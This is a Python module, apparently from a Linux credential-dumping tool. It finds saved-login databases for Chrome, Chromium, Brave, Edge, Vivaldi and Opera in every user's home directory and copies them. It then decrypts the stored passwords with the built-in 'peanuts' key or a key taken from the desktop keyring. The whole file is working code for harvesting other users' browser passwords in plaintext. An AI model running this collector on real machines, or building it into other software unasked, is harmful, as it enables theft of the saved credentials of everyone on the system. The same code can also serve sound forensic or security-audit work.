"""Chromium-family saved logins (Chrome, Chromium, Brave, Edge, Vivaldi, Opera).

On Linux the password column in 'Login Data' (SQLite) is AES-128-CBC encrypted.
The AES key is PBKDF2(passphrase, salt="saltysalt", iters=1, dklen=16) where the
passphrase is either:
  - the hard-coded "peanuts" (browser ran without a usable keyring), or
  - the "Chrome Safe Storage" value stored in the desktop keyring.

We try the keyring-derived key first (exposed by KeyringCollector via
opts["chromium_key"]), then fall back to "peanuts".
"""
from __future__ import annotations

import base64
import os
import re
import shutil
import sqlite3
import tempfile
from typing import List

from core.secret import Secret, Status
from core.tools import read_text, home_dirs, user_of_home
from .base import BaseCollector

_BROWSER_ROOTS = [
    ".config/google-chrome", ".config/chromium", ".config/BraveSoftware/Brave-Browser",
    ".config/microsoft-edge", ".config/vivaldi", ".config/opera",
    "snap/chromium/common/chromium", "snap/brave/*/.config/BraveSoftware",
    ".var/app/com.google.Chrome/config/google-chrome",
    ".var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser",
]
_LOGIN_DB_NAMES = ("Login Data", "Login Data For Account")

try:
    from Crypto.Cipher import AES
    _HAVE_AES = True
except Exception:
    try:
        from Cryptodome.Cipher import AES
        _HAVE_AES = True
    except Exception:
        _HAVE_AES = False

try:
    from hashlib import pbkdf2_hmac
    _HAVE_PBKDF2 = True
except Exception:
    _HAVE_PBKDF2 = False


def _derive_key(passphrase: bytes) -> bytes:
    return pbkdf2_hmac("sha1", passphrase, b"saltysalt", 1, dklen=16)


def _decrypt_v10(blob: bytes, key: bytes):
    if not (_HAVE_AES and _HAVE_PBKDF2):
        return None
    if not blob or blob[:3] not in (b"v10", b"v11"):
        return None
    try:
        enc = blob[3:]
        iv = b" " * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec = cipher.decrypt(enc)
        if not dec:
            return None
        pad = dec[-1]
        if 1 <= pad <= 16:
            dec = dec[:-pad]
        txt = dec.decode("utf-8", "ignore")
        return txt or None
    except Exception:
        return None


def _iter_profiles(base: str):
    if not os.path.isdir(base):
        return
    candidates = ["Default"] + [d for d in os.listdir(base)
                                if d.startswith("Profile")]
    for prof in candidates + ["."]:
        pdir = os.path.join(base, prof)
        for name in _LOGIN_DB_NAMES:
            db = os.path.join(pdir, name)
            if os.path.isfile(db):
                label = os.path.basename(base) + "/" + prof
                yield label, db


class ChromiumCollector(BaseCollector):
    name = "Chromium"
    description = "Chrome/Chromium/Brave/Edge saved logins (Login Data)"

    def collect(self) -> List[Secret]:
        found: List[Secret] = []
        # Prefer the keyring-derived key (set by KeyringCollector), else peanuts.
        ring = self.opts.get("chromium_key") if isinstance(self.opts, dict) else None
        key = ring if isinstance(ring, (bytes, bytearray)) else _derive_key(b"peanuts")
        key_source = "keyring" if isinstance(ring, (bytes, bytearray)) else "peanuts"

        for h in home_dirs():
            owner = user_of_home(h)
            for rel in _BROWSER_ROOTS:
                import glob as _glob
                for base in _glob.glob(os.path.join(h, rel)):
                    for label, db in _iter_profiles(base):
                        found += self._read_db(db, label, owner, key, key_source)
        return found

    def _read_db(self, db: str, label: str, owner: str, key: bytes, key_source: str) -> List[Secret]:
        out: List[Secret] = []
        tmp = None
        try:
            fd, tmp = tempfile.mkstemp(prefix="nixdump-logindata-")
            os.close(fd)
            shutil.copy2(db, tmp)
            con = sqlite3.connect(tmp)
            cur = con.execute(
                "SELECT origin_url, username_value, password_value FROM logins")
            rows = cur.fetchall()
            con.close()
        except Exception as e:
            if tmp and os.path.exists(tmp):
                os.unlink(tmp)
            return [Secret("Chromium", owner, db, Status.INFO, target=db,
                           secret_type="browser-db",
                           notes="Login Data present, unreadable offline: %s" % e)]
        finally:
            if tmp and os.path.exists(tmp):
                try:
                    os.unlink(tmp)
                except Exception:
                    pass

        for url, user, pw_blob in rows:
            if not url and not user:
                continue
            blob = pw_blob if isinstance(pw_blob, (bytes, bytearray)) else b""
            plain = _decrypt_v10(bytes(blob), key)
            if plain:
                out.append(Secret("Chromium", user or "", plain, Status.DECRYPTED,
                                  target=url, secret_type="browser-password",
                                  notes="%s (%s)" % (label, key_source)))
            else:
                b64 = base64.b64encode(bytes(blob)).decode() if blob else ""
                note = ("%s - keyring-protected; decrypt from live session "
                        "(or install pycryptodome if basic store)" % label)
                out.append(Secret("Chromium", user or "", url or db, Status.INFO,
                                  target=url, secret_type="browser-password-enc",
                                  notes=note, material=b64))
        return out
